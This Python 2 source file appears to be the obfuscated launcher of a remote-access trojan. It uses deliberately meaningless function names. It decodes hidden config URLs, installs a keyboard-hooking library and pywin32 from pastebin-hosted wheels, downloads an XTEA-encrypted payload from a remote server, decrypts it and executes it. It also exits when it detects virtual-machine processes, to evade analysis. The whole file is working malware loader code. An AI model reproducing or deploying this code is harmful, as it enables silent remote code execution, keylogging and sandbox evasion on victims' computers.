from __future__ import print_function
import os
import sys
import json
import struct
import base64
import urllib
import subprocess

 
__DEBUG__ = False


def run(*args, **kwargs):
    def decrypt(data, key):
        data    = base64.b64decode(data)
        blocks  = [data[i * 8:((i + 1) * 8)] for i in range(len(data) // 8)]
        vector  = blocks[0]
        result  = []
        for block in blocks[1:]:
            u,v = struct.unpack("!2L", block)
            k   = struct.unpack("!4L", key)
            d,m = 0x9e3779b9L, 0xffffffffL
            sum = (d * 32) & m
            for _ in range(32):
                v   = (v - (((u << 4 ^ u >> 5) + u) ^ (sum + k[sum >> 11 & 3]))) & m
                sum = (sum - d) & m
                u   = (u - (((v << 4 ^ v >> 5) + v) ^ (sum + k[sum & 3]))) & m
            packed  = struct.pack("!2L", u, v)
            output  = "".join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, packed))
            vector  = block
            result.append(output)
        return "".join(result).rstrip("\x00")
    IncontinentObtuseCucumber = lambda x: long(bytes(x).encode('hex'), 16)
    SomberUnbecomingAmusement = lambda x: bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241{}'.format(x))).strip('0x').strip('L')))
    RuthlessSpiffyTablecloth  = lambda x: os.popen(' '.join([i for i in x])).read().rstrip() if type(x) is list else os.popen(x).read().rstrip()
    SeamlessGalacticSponges   = lambda x: print(str(x)) if __DEBUG__ else ''
    AccidentalAquaticCat      = json.loads(urllib.urlopen(SomberUnbecomingAmusement(kwargs.get('config'))).read()) if 'config' in kwargs else {}
    AccidentalAquaticCat['f'] = bytes(IncontinentObtuseCucumber(__file__))
    GroovySophisticatedLemur  = os.popen('where pip').read().rstrip() if os.name is 'nt' else os.popen('which pip').read().rstrip()
    if not len(GroovySophisticatedLemur):
        exec urllib.urlopen("https://bootstrap.pypa.io/get-pip.py").read() in globals()
        return SomberUnbecomingAmusement(AccidentalAquaticCat.get('l'))
    else:
        try:
            os.chdir(os.path.expandvars('%TEMP%')) if os.name is 'nt' else os.chdir('/tmp')
            OrganicFecalOrigin = json.loads(urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat['t'])).read()).get(os.name).get(str(struct.calcsize('P') * 8))
            for FoamyNonstopHistory, NobleRusticWalrus in OrganicFecalOrigin.items():
                if not len(RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])):
                    RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', FoamyNonstopHistory])
                    if not len(RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])):
                        if 'pyHook' in FoamyNonstopHistory and 'pastebin' in NobleRusticWalrus:
                            ZonkedEnthusiasticTadpole = 'pyHook-1.5.1-cp27-cp27m-win_amd64.whl'
                            with file(ZonkedEnthusiasticTadpole, 'wb') as fp:
                                fp.write(base64.b64decode(urllib.urlopen(NobleRusticWalrus).read()))
                            RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', ZonkedEnthusiasticTadpole])
                            if os.path.isfile(ZonkedEnthusiasticTadpole):
                                os.remove(ZonkedEnthusiasticTadpole)
                        elif 'pypiwin32' in FoamyNonstopHistory and 'pastebin' in NobleRusticWalrus:
                            ZonkedEnthusiasticTadpole = 'pywin32-221-cp27-cp27m-win_amd64.whl'
                            with file(ZonkedEnthusiasticTadpole, 'wb') as fp:
                                fp.write(base64.b64decode(urllib.urlopen(NobleRusticWalrus).read()))
                            RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', ZonkedEnthusiasticTadpole])
                            SilkyPerilousManifesto  = os.path.join(sys.prefix, os.path.join('Scripts', 'pywin32_postinstall.py'))
                            if os.path.isfile(SilkyPerilousManifesto):
                                RuthlessSpiffyTablecloth([SilkyPerilousManifesto, '-install'])
                            if os.path.isfile(ZonkedEnthusiasticTadpole):
                                os.remove(ZonkedEnthusiasticTadpole)
                        else:
                            try:
                                RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', NobleRusticWalrus])
                            except Exception as e:
                                SeamlessGalacticSponges('Install error: {}'.format(str(e)))
                    else:
                        SeamlessGalacticSponges(FoamyNonstopHistory + ' loaded')
                else:
                    SeamlessGalacticSponges(FoamyNonstopHistory + ' loaded')
        finally:
            QuarrelsomeImportedAtom = decrypt(urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read(), urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('z'))).read()) if 'z' in AccidentalAquaticCat else urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read()
            exec(QuarrelsomeImportedAtom + "\n\nif __name__ == '__main__':\n\tmain(**{})".format(json.dumps(AccidentalAquaticCat))) in globals()
            


def main(*args, **kwargs):
    s = 'tasklist' if os.name is 'nt' else 'ps'
    c = 0 if os.name is 'nt' else -1
    if 'checkvm' in kwargs:
        if bool([i.split()[c] for i in os.popen(s).read().splitlines()[2:] if i.split()[c].lower().split('.')[0] in ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser', 'vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem'] if 'checkvm' in args]):
            if __DEBUG__:
                print('aborting')
            sys.exit(0)
    if 'config' in kwargs:
        client = run(**kwargs)
        return client
        if type(client) is str and client.startswith('http'):
            exec urllib.urlopen(client).read()
        elif hasattr(client, 'pid'):
            while True:
                if client.poll():
                    if __DEBUG__:
                        print('restarting')
                    time.sleep(1)
                    client = run(**kwargs)
                else:
                    time.sleep(1)
        else:
            time.sleep(1)
            return main(**kwargs)


    
# This line is reserved for the client to replace with a custom "if __name__ == '__main__'" statement with arguments to decrypt the launcher and configure the client.

